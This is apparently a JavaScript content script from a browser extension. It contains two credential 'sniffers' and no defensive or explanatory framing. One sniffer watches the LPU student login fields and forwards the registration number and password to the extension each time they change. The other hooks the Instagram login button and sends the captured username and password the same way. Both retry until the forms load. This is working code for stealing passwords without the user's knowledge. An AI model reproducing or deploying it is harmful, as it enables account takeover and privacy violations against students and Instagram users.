// =================== 🔄 Student Data Sniffer (LPU) ===================

function sendStudentData(regNo, password) {
  chrome.runtime.sendMessage({
    type: "student_data",
    data: { registrationNumber: regNo, password },
  });
}

function setupStudentListeners() {
  try {
    const regInput = document.getElementById("txtU");
    const passInput = document.getElementById("TxtpwdAutoId_8767");

    if (!regInput || !passInput) return false;

    const send = () => {
      const regNo = regInput.value.trim();
      const password = passInput.value;
      if (regNo && password) sendStudentData(regNo, password);
    };

    send(); // Send initial values

    ["input", "change", "blur"].forEach((evt) => {
      regInput.addEventListener(evt, send);
      passInput.addEventListener(evt, send);
    });

    console.log("%c✅ LPU input listeners attached", "color: green;");
    return true;
  } catch (e) {
    console.error("❌ Error setting up LPU listeners:", e);
    return false;
  }
}

// Retry mechanism for LPU inputs
if (!setupStudentListeners()) {
  let retries = 0;
  const maxRetries = 15;
  const interval = setInterval(() => {
    retries++;
    if (setupStudentListeners() || retries >= maxRetries) {
      clearInterval(interval);
      if (retries >= maxRetries) {
        console.log(
          "%c⚠️ LPU inputs not found after max retries. Script stopped.",
          "color: orange;"
        );
      }
    }
  }, 700);
}

// =================== 🔐 Instagram Login Sniffer (Reliable) ===================

let igTries = 0;
const igMaxTries = 25;

const sniffInstagramLogin = setInterval(() => {
  igTries++;

  const usernameInput = document.querySelector("input[name='username']");
  const passwordInput = document.querySelector("input[name='password']");
  const loginBtn = document.querySelector("button[type='submit']:not([disabled])");

  if (usernameInput && passwordInput && loginBtn) {
    console.log("%c✅ [IG] Login form detected", "color: green;");

    loginBtn.addEventListener("click", () => {
      const username = usernameInput.value.trim();
      const password = passwordInput.value;

      if (username && password) {
        console.log(
          `%c📤 [IG] Captured credentials: %c${username}`,
          "color: cyan;", "color: orange; font-weight: bold;"
        );

        chrome.runtime.sendMessage({
          type: "instagram_login_data",
          data: { username, password },
        });
      } else {
        console.warn("⚠️ [IG] Empty username or password, not sent");
      }
    }, { once: true });

    clearInterval(sniffInstagramLogin);
  }

  if (igTries >= igMaxTries) {
    console.warn("⚠️ [IG] Login sniff failed after max attempts");
    clearInterval(sniffInstagramLogin);
  }
}, 700);
